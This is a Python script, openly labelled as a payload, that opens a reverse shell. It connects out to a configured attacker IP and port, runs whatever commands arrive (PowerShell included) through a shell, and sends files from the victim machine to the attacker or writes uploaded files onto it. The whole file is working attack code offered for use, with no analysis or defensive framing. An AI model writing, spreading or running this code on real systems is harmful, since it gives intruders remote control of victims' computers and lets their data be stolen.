import socket
import subprocess
import os

# Configure attacker's IP and port
LHOST = "192.168.1.13"  # Replace with the attacker's IP address
LPORT = 4444           # Replace with the attacker's listening port

# Function to execute commands
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}\n"

# Function to handle the connection
def handle_connection():
    try:
        # Connect to the attacker's system
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((LHOST, LPORT))
        sock.send(b"[*] Connection established\n")
        
        while True:
            # Receive command from the attacker
            sock.send(b"Shell> ")
            command = sock.recv(1024).decode().strip()
            
            if not command:
                continue
            
            # Exit the connection
            if command.lower() == "exit":
                sock.send(b"[*] Closing connection...\n")
                break
            
            # Download file
            if command.lower().startswith("download"):
                try:
                    filename = command.split(" ", 1)[1]
                    with open(filename, "rb") as file:
                        sock.send(file.read())
                except Exception as e:
                    sock.send(f"Error downloading file: {e}\n".encode())
            
            # Upload file
            elif command.lower().startswith("upload"):
                try:
                    filename = command.split(" ", 1)[1]
                    sock.send(b"[*] Ready to receive file data\n")
                    with open(filename, "wb") as file:
                        file_data = sock.recv(1024)
                        while file_data:
                            file.write(file_data)
                            file_data = sock.recv(1024)
                        sock.send(b"[*] Upload complete\n")
                except Exception as e:
                    sock.send(f"Error uploading file: {e}\n".encode())
            
            # Execute PowerShell command
            elif command.lower().startswith("powershell"):
                try:
                    powershell_command = command.split(" ", 1)[1]
                    result = execute_command(f"powershell {powershell_command}")
                    sock.send(result.encode())
                except Exception as e:
                    sock.send(f"Error: {e}\n".encode())
            
            # Execute general command
            else:
                output = execute_command(command)
                sock.send(output.encode())
        
        sock.close()
    except Exception as e:
        print(f"Error: {e}")
        exit()

# Run the payload
if __name__ == "__main__":
    handle_connection()
